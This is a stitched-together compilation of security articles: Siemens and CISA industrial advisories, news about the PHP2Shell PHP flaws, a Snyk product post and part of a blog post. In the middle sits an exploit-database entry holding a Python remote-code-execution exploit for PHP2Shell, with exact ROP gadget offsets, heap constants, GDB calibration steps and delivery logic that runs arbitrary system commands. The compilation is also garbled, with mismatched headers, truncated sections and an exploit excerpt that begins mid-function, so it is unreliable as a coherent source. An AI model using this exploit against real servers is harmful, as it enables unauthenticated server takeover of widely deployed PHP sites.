View CVE Details

Acknowledgments

Siemens ProductCERT reported this vulnerability to CISA.

General Recommendations

As a general security measure, Siemens strongly recommends to protect network access to devices with appropriate mechanisms. In order to operate the devices in a protected IT environment, Siemens recommends to configure the environment according to Siemens' operational guidelines for Industrial Security (Download: https://www.siemens.com/cert/operational-guidelines-industrial-security), and to follow the recommendations in the product manuals. Additional information on Industrial Security by Siemens can be found at: https://www.siemens.com/industrialsecurity

Additional Resources

For further inquiries on security vulnerabilities in Siemens products and solutions, please contact the Siemens ProductCERT: https://www.siemens.com/cert/advisories

Terms of Use

The use of Siemens Security Advisories is subject to the terms and conditions listed on: https://www.siemens.com/productcert/terms-of-use.

Recommended Practices

CISA recommends users take defensive measures to minimize the risk of exploitation of these vulnerabilities.

Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet.

Locate control system networks and remote devices behind firewalls and isolating them from business networks.

When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices.

CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.

CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics. Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies.

CISA encourages organizations to implement recommended cybersecurity strategies for proactive defense of ICS assets.

Additional mitigation guidance and recommended practices are publicly available on the ICS webpage at cisa.gov/ics in the technical information paper, ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies.

Organizations observing suspected malicious activity should follow established internal procedures and report findings to CISA for tracking and correlation against other incidents.

Summary

SENTRON 3NA COM Fuse contains a Denial-of-Service vulnerability. Improper handling of a network management message could allow an attacker to trigger a denial-of-service (DoS) condition. Successful exploitation may require the affected network to be re-established to restore normal operation.

The following versions of Siemens SENTRON 3NA COM Fuse are affected:

Summary

RUGGEDCOM CROSSBOW contains multiple vulnerabilities that could allow an attacker to execute arbitrary SQL commands on the underlying database, retrieve sensitive administrative credentials, escalate privileges, and perform unauthorized operations such as modifying system configurations or causing a denial of service. Siemens has released a new version for RUGGEDCOM CROSSBOW and recommends to update to the latest version.

The following versions of Siemens RUGGEDCOM CROSSBOW are affected:

RUGGEDCOM CROSSBOW vers:intdot/<6.0 (CVE-2026-89196, CVE-2026-89197, CVE-2026-89198, CVE-2026-89199, CVE-2026-89200, CVE-2026-89201, CVE-2026-89202, CVE-2026-89203, CVE-2026-89204, CVE-2026-89205, CVE-2026-89206)

articles.full_text:
View CSAF

Summary

Nozomi Networks has published information on vulnerabilities in Nozomi Guardian/CMC. This advisory lists the related Siemens Industrial products affected by these vulnerabilities. Siemens recommends to contact customer support to receive patch and update information.

The following versions of Siemens RUGGEDCOM APE1808 Devices are affected:

RUGGEDCOM APE1808 vers:all/* (CVE-2026-33387, CVE-2026-33388, CVE-2026-33389, CVE-2026-33391, CVE-2026-33920)

CVSS

Vendor

Equipment

CVSS v3 7.5

Vendor Siemens

Equipment RUGGEDCOM APE1808

4 Vulnerabilities

4 Vulnerabilities Improper Neutralization of Special Elements Used in a Template Engine, Incorrect Authorization, Lack of Administrator Control over Security, Cross-Site Request Forgery (CSRF)

Background

Critical Infrastructure Sectors: Critical Manufacturing, Transportation Systems, Energy, Healthcare and Public Health, Financial Services, Government Services and Facilities

Countries/Areas Deployed: Worldwide

Company Headquarters Location: Germany

Vulnerabilities

Expand All +

CVE-2026-33387

A template injection vulnerability was discovered in the Dashboards functionality due to improper validation of an input parameter. An authenticated user with the required privileges can define a dashboard containing a malicious payload, or a victim can be socially engineered into importing a malicious dashboard. When the victim views or imports the dashboard, the payload executes in their browser context, allowing the attacker to modify application data or disrupt application availability.

Read More

1 Affected Product

RUGGEDCOM APE1808 with Nozomi Guardian/CMC

Product Status: known_affected

Remediations

Vendor fixContact customer support to receive patch and update information

Additional Metrics

Relevant CWE: CWE-1336 Improper Neutralization of Special Elements Used in a Template Engine

CVSS Version

Base Score

Base Severity

Vector String

CVSS Version 3.1

Base Score 4.6

Base Severity MEDIUM

Vector String CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:L

View CVE Details

CVE-2026-33388

An access control vulnerability was discovered in the Credentials Manager functionality due to insufficient validation of user privileges. A remote authenticated user with limited privileges can view a limited subset of the available entries in the Credentials Manager. The actual credential values are not directly visible, but the user can delete entries or edit their properties. An attacker who deletes or edits an entry can disrupt authentication for dependent devices, and one who manipulates an entry's configuration may be able to indirectly obtain the credentials.

Read More

RUGGEDCOM APE1808 with Nozomi Guardian/CMC

Product Status: known_affected

Remediations

Vendor fixContact customer support to receive patch and update information

RUGGEDCOM APE1808 with Nozomi Guardian/CMC

Base Score

Vector String

Base Severity HIGH

Vector String CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L

View CVE Details

CVE-2026-33389

An improper certificate/host key validation vulnerability was discovered in the Smart Polling functionality, which established encrypted connections to target devices without validating the remote host's identity, and no option was provided to enable it. A man-in-the-middle attacker positioned between a sensor and a polled device can, during a polling session, impersonate the device and intercept the communication, including the credentials used to access it. The captured credentials can then be replayed to authenticate against the device itself or against other devices sharing the same credentials, allowing the attacker to access and tamper with the device's data and to disrupt its operations.

CVE-2026-33391

An access control vulnerability was discovered in the Smart Polling configuration functionality due to insufficient validation of user privileges. An authenticated user with limited privileges can remotely bypass the intended access control of the web management interface and modify the Smart Polling discovery configuration. This allows the attacker to disrupt the visibility of assets in the monitored network.

Recommended Practices

CISA recommends users take defensive measures to minimize the risk of exploitation of these vulnerabilities.

Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet.

Locate control system networks and remote devices behind firewalls and isolating them from business networks.

When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices.

CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.

articles.title: Siemens Industrial Edge Device Kit
articles.context: Industrial Edge Device Kit contains multiple path traversal vulnerabilities that could facilitate an authenticated remote attacker to access sensitive internal information
articles.full_text:
View CSAF

Summary

Users of Industrial Edge Devices are advised to consult the respective Security Advisories for their devices (for Siemens Industrial Edge devices see Additional Information). Industrial Edge Device Kit contains multiple path traversal vulnerabilities that could facilitate an authenticated remote attacker to access sensitive internal information. Siemens has released new versions for several affected products and recommends to update to the latest versions. Siemens recommends specific countermeasures for products where fixes are not, or not yet available.

The following versions of Siemens Industrial Edge Device Kit are affected:

Industrial Edge Device Kit - arm64 V1.10 vers:all/* (CVE-2026-44414, CVE-2026-44415)

Background

Countries/Areas Deployed: Worldwide

Company Headquarters Location: United States

Vulnerabilities

CVE-2026-111594

InterSystems IRIS for Health has TLS/SSL encryption turned off by default, which may enable an attacker to view transmitted data and use that data to log into the device.

Read More

InterSystems Corporation InterSystems IRIS for Health: 2026.2.0.221

"Enabled", which means that client communications may use TLS (but they also may not) and "Required", which forces all client communications to use TLS.

Summary

The products listed below contain a vulnerability that could allow an attacker to boot an operating system or UEFI application signed with that test key, bypassing UEFI Secure Boot protections even when Secure Boot is enabled. Siemens has released new versions for the affected products and recommends to update to the latest versions.

The following versions of Siemens SIMATIC IPCs are affected:

SIMATIC IPC BX-21A vers:intdot/<31.01.13 (CVE-2026-72895)

SIMATIC IPC RW-543A vers:intdot/<1.1.4 (CVE-2026-72895)

SIMATIC IPC227G / IPC277G / IPC277G PRO / IPC327G / IPC377G vers:intdot/<28.01.15 (CVE-2026-72895)

CVSS

Vendor

Equipment

CVSS v3 7.7

Vendor Siemens

Equipment SIMATIC IPC BX-21A

1 Vulnerability

1 Vulnerability Use of Default Cryptographic Key

Background

Critical Infrastructure Sectors: Critical Manufacturing, Transportation Systems, Energy, Healthcare and Public Health, Financial Services, Government Services and Facilities

Countries/Areas Deployed: Worldwide

Company Headquarters Location: Germany

Vulnerabilities

CVE-2026-72895

A BIOS vendor test key is present in the UEFI Secure Boot key database. This could allow a local attacker with physical or administrative access to the device to boot an operating system or UEFI application signed with that test key, bypassing UEFI Secure Boot protections even when Secure Boot is enabled, potentially leading to a full loss of confidentiality, integrity, and availability of the device.

Read More

3 Affected Products

SIMATIC IPC BX-21A < V31.01.13

Product Status: known_affected

Remediations

MitigationNote: After upgrading to the fixed BIOS version, users must load the BIOS default settings. If Secure Boot keys were already provisioned, they must be provisioned again afterwards.

MitigationAs a temporary mitigation, users can manually remove the test key from the database (e.g., "DO NOT TRUST - AMI Test PK" for RW-543A or "insyde-ElkhartLake" for IPC227G/277G/327G/377G and BX-21A). Note: Loading default settings will restore the test key, so upgrading remains recommended.

Vendor fixUpdate to V31.01.13 or later version

SIMATIC IPC RW-543A < V1.1.4

Product Status: known_affected

Remediations

articles.title: PHP2Shell Exploitation Attempt Detected by Amazon Four Days Before Vulnerability Disclosure
articles.context: Now the patches have been released, the Amazon Threat Intelligence team has publically confirmed they observed a PHP2Shell exploitation attempt dating October 17
articles.full_text:
Someone tried to exploit two critical vulnerabilities in the PHP programming language four days before the vulnerabilities were published and the flaws are now being exploited in the wild at scale, according to Amazon.

The flaws, tracked as CVE-2026-109618 and CVE-2026-109619 and collectively known as ‘PHP2Shell,’ could allow unauthenticated remote code execution (RCE) and server takeover on any websites relying on any PHP version released in the last decade – going back to version 5.4.

PHP is used by approximately 69.7% of websites whose server-side programming language is known, according to recent W3Techs data. These include many content management systems (CMS) like WordPress, Drupal, Joomla and Magento as well as e-commerce and web services platforms.

The bugs were discovered by security researchers at California-based security firm Calif and Google Cloud’s Wiz, with collaboration from OpenAI’s Patch the Planet project, in August. Public disclosure was scheduled for October 21, when the PHP Foundation planned to release the security patches.

However, on October 20, a pseudonymous user of the Hacker News forum leaked some information about the flaws before the patches were ready.

This led to many organizations across the world, including French public administrations, the Dutch National Cyber Security Centre and the University of Vienna taking their websites offline to prepare for and then apply the patches.

Now the patches have been released, the Amazon Threat Intelligence team has publically confirmed they observed a PHP2Shell exploitation attempt dating October 17. The attempt occurred in MadPot, an internal honeypot system created by Amazon Web Services (AWS) to monitor, study and disrupt global cybercrime.

Early Exploitation Attempt Likely From A “Threat Actor”

The exploit attempt originated from an IP address associated with a commercial anonymization network. According to the Amazon researchers, this suggests the activity was conducted by a threat actor, though it remains unclear how the actor acquired exploit information prior to disclosure.

In addition, they said they identified multiple proof-of-concept (PoC) exploits for PHP2Shell on October 21, around 12 hours before the vulnerability’s scheduled disclosure at 2pm GMT.

The earliest exploit was detected at approximately 2am GMT, with further attempts targeting the company’s MadPot sensors between 2am and 8am GMT from additional infrastructure.

According to the researchers, variations in the payloads and anonymization infrastructure suggested that multiple threat actors were involved. However, it was unclear whether the attempts would have succeeded against real-world systems.

Further PoC exploits emerged within hours of the release of the PHP2Shell patches, which were used against Amazon’s sensors almost immediately.

The researchers warned that PHP2Shell is now being broadly exploited in the wild.

Emerging Evidence of PHP2Shell Exploitation Attempts

Other security and threat intelligence teams have started to report active exploitation attempts of CVE-2026-109618 and CVE-2026-109619 in the wild.

Matthew Prince, co-founder and CEO of Cloudflare, said on X his company saw “thousands of attempts to exploit” the vulnerabilities within the 10 hours that preceded the disclosure.

“That jumped to tens of thousands in the 45 minutes post announcement, hundreds of thousands within two hours, and millions now,” he added.

Other security firms, including Beelzebub, Ellio, Recorded Future, VulnCheck, WatchTowr and Wiz have also observed evidence of exploitation attempts in the wild for both vulnerabilities.

articles.title: ZDI-26-790: OpenSSL CMS AuthEnvelopedData Improper Validation of Integrity Check Value Vulnerability

articles.full_text:
Vulnerability Details

This vulnerability allows network-adjacent attackers to tamper with CMS AuthEnvelopedData messages on affected installations of OpenSSL. An attacker must first obtain the ability to modify CMS AuthEnvelopedData messages in order to exploit this vulnerability.

The specific flaw exists within the handling of AES-GCM message authentication codes. The issue results from an improper integrity check. An attacker can leverage this vulnerability to tamper with authenticated data.

Additional Details

OpenSSL has issued an update to correct this vulnerability. More details can be found at: https://openssl-library.org/news/secadv/20260609.txt

articles.title: Turn Your Vulnerability Backlog Into Pull Requests With Agentic Remediation
articles.context: For example, an AppSec team can launch a campaign targeting high- and critical-severity dependency vulnerabilities across repositories in a Snyk Organization
articles.full_text:
The Evo Remediation Agent is now in Open Preview, bringing automated dependency resolution to Evo Agentic AppSec. AppSec teams can now run ongoing remediation campaigns across repositories and deliver proposed fixes to developers through validated pull requests.

Fixing a dependency vulnerability can mean choosing an upgrade, resolving dependency conflicts, adapting the application, and/or checking the result. That work competes with everything developers are already building. As teams introduce code and new vulnerabilities at increasingly exponential rates, AppSec needs a way to accelerate remediation across the applications they protect.

With the help of agentic remediation, AppSec teams can start by leveraging campaigns targeting a defined set of repositories and vulnerabilities. Snyk supplies the model and hosted sandbox environment, and developers receive proposed changes through their existing source code management (SCM) workflow. The developers continue to retain control over final review and merging.

Give AppSec a way to drive fixes

A remediation campaign defines which vulnerabilities the agent works on, in which repositories, and on what schedule. AppSec teams set the scope, and Evo Remediation Agent works through eligible vulnerabilities and opens pull requests for developers to review.

For example, an AppSec team can launch a campaign targeting high- and critical-severity dependency vulnerabilities across repositories in a Snyk Organization. Recurring campaigns repeat that work on a schedule as repositories and vulnerability findings change.

That gives AppSec teams a way to initiate remediation without asking each developer to install and run an agent. Teams can follow repository outcomes across a campaign, review where the agent produced fixes, and investigate where remediation efforts still need attention.

Snyk first brought automated dependency updates into developer workflows with automatic Fix PRs across SCA and Container. Agent Fix extended remediation to source-code vulnerabilities detected by Snyk Code, our first AI-native solution generating and checking proposed fixes. The initial Evo Remediation Agent then brought a broader workflow into the CLI and ADE: plan the fix, apply changes, and validate the result in the developer’s environment. Now, fully validated, the next iteration of the Evo Remediation Agent brings campaigns that automate agentic remediation to AppSec teams.

Starting once again with Open Source vulnerabilities, teams can put the agent to work across repositories and make remediation an ongoing part of their security program.

Security context guides the work

A dependency update can require changes throughout an application. The agent uses Snyk findings to plan updates, applies changes in a hosted sandbox, and checks its work with builds, available tests, and rescans. This feedback helps the agent work through the changes an upgrade requires.

When the agent produces a fix, it opens a pull request and records each action attached to the change. Teams can restrict campaigns to fixes assessed as non-breaking, and the agent does not merge changes. Developers review the proposed changes and decide whether to merge them.

Evidence behind the remediation engine

Generating a fix only helps reduce risk if a developer can merge it. A pull request that breaks the build, fails existing tests, or leaves the vulnerability in place adds review work and doesn’t shrink the backlog. A high mergeable fix rate is what turns agent fix suggestions into backlog reduction because more of the fix pull requests actually get merged with less developer rework.

The VulnBump benchmark tests the mergeable fix rate of the engine that powers Evo Remediation Agent. Across 307 dependency-upgrade tasks, the CLI-based Remediation Agent passed all four verification checks on 90.2% of tasks. Claude Code with Snyk findings passed 77.5%, and Claude Code alone passed 59.6%. All three used the same model.

Those checks cover the outcomes that matter to a dependency fix: dependencies resolve, the targeted vulnerabilities disappear on rescan, the application builds, and previously passing tests still pass. The results show the value of combining security context with a purpose-built remediation workflow.

Fix first. Prioritize the rest.

Remediation programs usually start by deciding what to fix. Evo Remediation Agent reverses that order, giving AppSec teams another way to act on the backlog. Recurring campaigns work through eligible vulnerabilities in scope, so what reaches your team is then the work that needs human judgment.

Repository outcomes and journals help teams understand where the agent made progress and where further work remains. AppSec teams get a running view not only of the backlog, but also the pull requests opened, while developers get a record of why each change was made. Remediation consequently becomes an ongoing part of the security program, with your team setting the standard for what ships.

Bring remediation to your team

The Evo Remediation Agent is in Open Preview for Snyk Open Source vulnerabilities in Evo Agentic AppSec. To run campaigns, you need:

Workspaces

SCM integration

Preview access for your Tenant.

During Open Preview, a daily fix allowance applies, and hosted sandboxes use public package registries. Ready to put Evo Remediation Agent to work on your backlog? Talk to your Snyk account team about Open Preview access.

articles.title: Hackers Exploited the PHP Vulnerabilities Days Before They Were Patched
articles.context: The internet’s mad scramble on Wednesday to patch a pair of critical vulnerabilities in PHP, a widely used web scripting language, was already too late to stop every attack,...
articles.full_text:
The internet’s mad scramble on Wednesday to patch a pair of critical vulnerabilities in PHP, a widely used web scripting language, was already too late to stop every attack, newly released details reveal.

Wednesday’s release of fixes for two critical vulnerabilities in PHP caused administrators and security staff to race to identify and patch vulnerable websites and apps, while attackers inevitably reverse engineered the fixes to learn how to exploit the flaws. Some governments and other groups even proactively took key websites down in anticipation of the release, so they wouldn't be targeted before they could apply the patches.

But in addition to detecting such active exploitation on Wednesday, research published Wednesday evening by Amazon Web Services indicates that at least one actor had started attempting to exploit the bugs—known collectively as PHP2Shell—on October 17, four days before Wednesday's public revelations.

AWS analysts spotted the October 17 exploitation on Wednesday while looking back at activity on one of their so-called honeypots, or intentionally vulnerable web servers or other digital lures that help researchers study attack methods and trends. The attempt came from an IP address that AWS says is linked to a “commercial anonymization network,” in other words a proxy network or VPN.

“While the vulnerability was under embargo, the targeting of a honeypot from an anonymized IP address suggests the activity was conducted by a threat actor, though it remains unclear how the actor acquired exploit information prior to disclosure,” CJ Moses, AWS's chief information security officer, wrote in the research post.

Elizabeth Barron, executive director of the PHP Foundation, tells WIRED that the organization was unaware of AWS's research prior to publication and did not immediately have a comment on the findings. She added, “Although we agree that upgrading is absolutely imperative, to our knowledge, there has been no successful attempt at remote code execution.”

Proof-of-concept exploits for PHP2Shell began emerging publicly on Wednesday, with some seeming to appear hours before the public disclosure at 10 am ET. In the hours leading up to the disclosure, AWS researchers say their honeypots were hit with multiple exploitation attempts anonymized using various providers and seemingly with various attack goals, likely indicating multiple different actors. “Technical analysis is ongoing, and it’s unclear if any of these attempts would have succeeded in real-world systems,” Moses wrote. He added that “PHP2Shell is now being broadly exploited in the wild.”

Though it is unclear how the exploitation on October 17 happened or where it came from, AWS emphasizes that the findings underscore how coordinated vulnerability disclosure must evolve and speed up, given global access to AI tools that can accelerate vulnerability analysis and allow less technically proficient actors to quickly develop new exploits.

“The time from patch to working exploit is shrinking for structural reasons,” Moses wrote. “In the past, most exploitation we observed came after a public proof of concept was released. A small number of capable actors built exploits, and everyone else waited for them. That dependency is weakening. AI-assisted analysis makes it cheaper to turn a patch diff or advisory into a working exploit. As a result, more actors can act within hours or even minutes once technical details of a vulnerability are disclosed.”

Updated 10/22/2026 at 10:10 am ET to include comment from the PHP Foundation.

articles.title: [remote] PHP2Shell (CVE-2026-109618) - PHP core versions after v5.4 - RCE
articles.context: txt' Purpose and vulnerability mechanisms ==================================== This is a pure-HTTP, application-independent research exploit for an isolated lab
articles.full_text:
#!/usr/bin/env python3 """PHP2Shell RCE chain for PHP 8.5.11 apache/mod_php. Usage: python3 exploit.py --host TARGET --rce 'id>/var/www/html/proof.txt' Purpose and vulnerability mechanisms ==================================== This is a pure-HTTP, application-independent research exploit for an isolated lab. Its default endpoint is ``/index.php`` and is configurable with ``--path``. With no ``--rce`` it stops after reproducing the overlong ``Set-Cookie`` disclosure. With ``--rce [COMMAND]`` it composes two distinct PHP memory-safety mechanisms. Bare ``--rce`` runs the documented default and verifies ``/proof.txt``; a custom command is delivered without claiming that its execution was verified. 1. The A1/B1 disclosure is derived from 9bie's cross-request session-state chain. An upload-progress request reaches an OOM bailout before request state is safely reset; a later request in the *same mod_php child* consumes the stale ``PS(id)`` and encodes an attacker-forged ``zend_string`` into the session cookie. This is strongest-fit **CVE-2026-109619** behavior: request- owned session globals outlive their backing request heap. OOM is the producer, but the security boundary crossed by this stage is request lifetime. This is mechanism-based attribution, not a CNA reassignment of any individual public PoC. 2. The optional final sink is adapted from Cookiengineer's OOM RCE. Multipart amplification exhausts the stock 128 MiB heap while ``_zend_hash_str_add_or_update_i()`` has counted but not initialized its final ``HashTable`` bucket. Same-request shutdown walks the incomplete bucket into a forged object, a libphp-only ``jump_fcontext`` ROP chain, and ``zif_system``. This is the incomplete-state/cleanup mechanism of **CVE-2026-109618**. Worker discovery, chunked transfer, prefork saturation, the full-pool scrub, and the clean holder rebind are delivery/affinity techniques, not additional CVEs. The scrub exists because the validated Apache environment can retain children already marked for graceful retirement when its IPv6 listener wakeup fails; without it, a second invocation may place A1 and B1 in different processes. The post-scrub repin is concurrent so VPN latency cannot recreate an idle-surplus window. Debugger mappings were used only to calibrate and independently verify the constants below; successful end-to-end runs derive their live bases from the HTTP cookie. Validated exact environment (2026-10-23) ======================================== This profile is intentionally build-specific. Recalibrate all offsets and heap geometry for any other binary, compiler flags, module set, architecture, or loader layout. * PHP 8.5.11 NTS, Zend Engine 4.5.11, source tag ``php-8.5.11``: annotated tag object ``597eb0b4e32cc8802e112fe13cc92fb5636a1781``; peeled source commit ``678778973bb4d4185c06ef1320de50f1a975d3c8``. * Official ``php-8.5.11.tar.xz`` SHA-256: ``d9be75c08e8c316f4c8f4194d8fbe1750a15f6a6d9d4e3fe72082abeeb800360``. * Source build flags: ``-O2 -g -fno-omit-frame-pointer -fcf-protection=none``; Apache 2.4.66 (Ubuntu) ``mod_php``/prefork on x86-64; glibc 2.43 (Ubuntu ``2.43-2ubuntu2.4``); validation kernel ``Linux 7.0.0-38-generic``. * ``/usr/lib/apache2/modules/libphp.so`` SHA-256: ``ecd97e302e8cb3fd106c0541410256ad6597cb6410166beee0ab773ff4974b36``; GNU Build ID ``c01226a7f67b3226c1d2f81f4fc5041846914117``. * ASLR enabled (``kernel.randomize_va_space=2``), Apache defaults including ``StartServers=5`` and ``MaxRequestWorkers=150``, and unmodified upstream ``php.ini-production``: ``memory_limit=128M``, ``post_max_size=8M``, ``upload_max_filesize=2M``, ``max_file_uploads=20``, ``max_input_vars=1000``, ``max_input_nesting_level=64``, error display off, logging on, and session upload progress plus cleanup enabled. * Exact module offsets: ``zval_ptr_dtor=0x7ae960``, ``zif_system=0x598650``, ``jump_fcontext+0x2e=0x6362ae``, ``pop rdi; ret=0x280d8d``, ``pop rsi; ret=0x2cbe07``, and alignment ``ret=0x280d8e``. * Exact heap/layout constants: Zend main chunk ``libphp+0x3400000``; post-disclosure controlled block ``main+0x5c400``; stale-ID forge page ``0x1e3``; 402,500 duplicate multipart headers for the stock-128M sink. * The combined upstream fix used for source comparison is php-src commit ``506e87fa7dcdd306975e5b8f8265ee03527aacbf`` ("Avoid state corruption via bailout"), released in the patched 8.5.12/8.4.27/8.3.30/8.2.29 lines. Recalibrating a different build =============================== Never transplant the constants above based only on ``PHP_VERSION``. Preserve the candidate module first, record its identity, and do all debugger work in an isolated copy of the target environment. For example:: LIBPHP=/usr/lib/apache2/modules/libphp.so sha256sum "$LIBPHP" readelf -n "$LIBPHP" | grep 'Build ID' readelf -lW "$LIBPHP" # record executable PT_LOAD ranges nm -an "$LIBPHP" | grep -wE 'zval_ptr_dtor|zif_system|jump_fcontext' ``nm`` values are image-relative because this module is ET_DYN. The pivot is ``jump_fcontext+0x2e`` only after disassembly confirms the same instruction sequence. Find and inspect ROP gadgets rather than copying byte offsets:: ROPgadget --binary "$LIBPHP" --only 'pop|ret' | \ grep -E 'pop rdi ; ret$|pop rsi ; ret$|: ret$' objdump -d -M intel "$LIBPHP" | less Verify every chosen gadget lies in an executable ``PT_LOAD`` and inspect its surrounding instructions. If normal symbols are stripped, use the matching debug file/build ID with ``readelf -Ws`` or GDB; do not derive offsets from a different package that merely reports the same PHP version. To recalibrate the disclosure, run a fresh debug child with the same INI and modules, pause the selected rebound worker, map its client port to a PID with ``ss -tnp``, and attach GDB. A convenient driver form is:: python3 exploit.py --host TARGET --port 80 --path /index.php \ --pause-after-rebind 60 # Read new_port from the log on the target, then: ss -tnp sport = :80 dport = :NEW_PORT gdb -q -p CHILD_PID (gdb) break php_url_encode (gdb) continue (gdb) p/x ps_globals.id (gdb) p/x ((unsigned long)ps_globals.id & 0x1fffff) >> 12 (gdb) p ps_globals.send_cookie The second GDB expression is the ID page; use it as ``--forge-page``. Sweep the A1 query/burner/progress lengths and B1 ``G``/``X`` geometry until GDB shows OOM in ``php_url_encode()``, ``PS(send_cookie)=1``, and the B1 cookie contains a highly repeated pointer that resolves exactly to the new ``zval_ptr_dtor``. Confirm the derived module base against mappings only *after* the HTTP result; mappings must never be an exploit input. Measure the module-to-main-chunk delta in several fresh ASLR parent lifetimes. With symbols loaded in GDB, compute the module base from a known symbol and align the Zend heap pointer to its 2 MiB chunk:: set $libphp = (unsigned long)&zval_ptr_dtor - NEW_DTOR_OFFSET set $main = (unsigned long)alloc_globals.mm_heap & ~0x1fffffUL p/x $libphp p/x $main p/x $main - $libphp Accept the delta only if it repeats for independently started Apache parents and the leaked cookie contains pointers in the derived main-chunk bucket. Finally recalibrate the 109618 sink *after the complete A1/B1 history*, not on a virgin worker. Use ``--pause-before-rce``, attach the selected debug child, and break on ``zend_mm_safe_error``, ``_zend_hash_str_add_or_update_i``, and ``zend_array_destroy``, and identify the shutdown table with ``nNumUsed=46``. For this payload layout the controlled block is ``arData-0x200``; subtract the aligned main-chunk base to obtain ``--rce-block-offset``. Sweep ``--rce-headers`` around the OOM boundary until the failed allocation is the 80,000-byte key's 81,920-byte allocation and the incomplete bucket contains the forged object. Recheck the pivot, fake handlers, ROP registers, and entry to ``zif_system`` in GDB, then validate without a debugger using a fresh, unique proof name. Repeat under a new ASLR parent and run twice without an Apache restart before treating the profile as usable. Direct lineage and credits ========================== Credit belongs to the original researchers and repositories. This local composition, retuning, worker scrub, and validation do not replace their copyright or licensing terms. * **9bie**, ``php2shell-bypass-aslr-exp`` commit ``17e98ee81025cccfd94b4f9c9a17bf269c65ff75``: A1/B1 session-state OOM, forged-cookie disclosure geometry, worker occupancy, and the original ASLR-on chain. The local 8.5.11 port widens its overly narrow ``0x7f`` pointer floor and retunes the heap geometry. * **dinosn**, ``php-cve-2026-10961x-lab-poc`` commit ``b1e419912219691417c72b122f6eb410b938eee7``: instrumented CVE controls, Ninebie-class porting, stock-configuration experiments, offset/profile work, and worker-saturation research used as comparison and calibration guidance. * **Cookiengineer**, ``actual-php2shell`` commit ``1d5208ba5090cbbc56a091f6607996c3bbb21171``: the independently validated CVE-2026-109618 incomplete-bucket/object-destruction RCE sink. The local adapter amplifies it to 128 MiB and replaces libc-dependent ROP with gadgets and ``zif_system`` from this exact libphp image. Other reviewed/referenced public PoCs (not direct code lineage for this file) are credited to **Eness** (``php2shell-CVE-2026-109618-CVE-2026-109619-PoC``, ``df8b16fe69ab7218f496b5d88127253fc90ff92e``), **0x4148** (``CVE-2026-109618-php2shell-lab``, ``bc40fb2c96d5e92121e6bf8b996f7ba3ad057413``), **Ikow** (``php2shell-poc``, ``31519e6d8a84dee1df1262961ed1bebb65accadd``), **Murrez** (``php2shell``, ``e62535936b5fb1d013f8f52832df8c740c88e672``), and **Syrex1013** (``php2shell``, ``2b14725288c519380810fb057b214889eea9ee76``). FIFO ordering # keeps B1 behind A1 even when A1 reaches OOM immediately. time.sleep(0.25) b1_process = start_chunked( args.host, args.port, args.path, b1, b1_response, args.timeout) time.sleep(0.05) released = holders.pop(queued_release_index) local_port = released.getsockname()[1] close_holder(released) print(f"[*] released rebound holder client_port={local_port} " "into queued A1/B1") finish_chunked(a1_process, a1_response, 200.0) print(f"[*] A1 response={a1_response.stat().st_size}") response = finish_chunked(b1_process, b1_response, args.timeout + 30.0) encoded = cookie_value(response) print(f"[*] B1 response={len(response)} encoded_cookie={len(encoded)}") if not encoded: print("[-] no Set-Cookie PHPSESSID value") return 1 result = summarize_cookie(encoded, args.pointer_floor) decoded = result["decoded"] pointers = result["pointers"] print(f"[*] decoded_cookie={len(decoded)} candidates={len(pointers)}") for value, count in result["top"]: print(f" {value:#014x} count={count}") if len(decoded) <= 256: print(f"[-] normal-size cookie: {decoded!r}") return 2 if pointers: dominant, count = pointers.most_common(1)[0] libphp = dominant - args.zval_ptr_dtor_offset buckets = Counter() for value, value_count in pointers.items(): buckets[value & ~0x1FFFFF] += value_count print(f"[+] dominant={dominant:#x} count={count} " f"libphp_candidate={libphp:#x}") print("[+] 2MiB pointer buckets: " + repr([ (hex(base), bucket_count) for base, bucket_count in buckets.most_common(8) ])) print("[+] overlong Set-Cookie disclosure reproduced") if args.rce is not None: if not pointers: print("[-] cannot run RCE without a module pointer") return 3 if count < 100 or libphp & 0x1FFFFF: print("[-] dominant pointer failed the exact-build profile") return 4 heap = libphp + args.heap_from_lib_delta if not buckets.get(heap): print("[-] derived main chunk is absent from leak buckets") return 5 print(f"[+] derived main_chunk={heap:#x} " f"(libphp+{args.heap_from_lib_delta:#x})") sys.stdout.flush() if args.pause_before_rce: print(f"[*] pausing {args.pause_before_rce:g}s before RCE", flush=True) time.sleep(args.pause_before_rce) time.sleep(0.2) proof_url = (DEFAULT_RCE_PROOF_URL if args.rce == DEFAULT_RCE_COMMAND else None) rce_verified = amplified_rce( args, heap, libphp, args.rce, proof_url) if rce_verified is False: print("[-] composed leak-to-RCE stage failed") return 6 if rce_verified: print("[+] composed leak-to-RCE chain succeeded") else: print("[?] composed leak-to-RCE payload delivered; " "execution unverified") return 0 finally: holder_stop.set() holder_thread.join(timeout=2) for sock in holders: try: sock.close() except OSError: pass if __name__ == "__main__": raise SystemExit(main())

articles.title: A patched PHP server can still be a compromised one by Lucie Cardiet
articles.context: Amazon's honeypots (decoy servers built to attract attackers) recorded the first attempt on October 17, four days before disclosure, and by October 21 Amazon was seeing broad...
articles.full_text:
On October 20, details of two critical flaws in PHP leaked online before the fixes were ready. PHP, the scripting language behind a large share of the web, moved its patch release up a day and shipped it on October 21. The flaws, CVE-2026-109618 and CVE-2026-109619 (nicknamed php2shell), let an attacker run commands on a web server through PHP itself, with no login needed.

Patch now. CISA added both flaws to its list of exploited vulnerabilities on October 26. That advice is right, and it leaves a gap. This post is about the gap.

Attackers were testing the flaw before the fix existed

Fixes are out for PHP 8.2 to 8.5,and PHP says PHP 8.1 and older will not get updates. One estimate counts about 884,000 such servers still online, a rough figure from a single source.

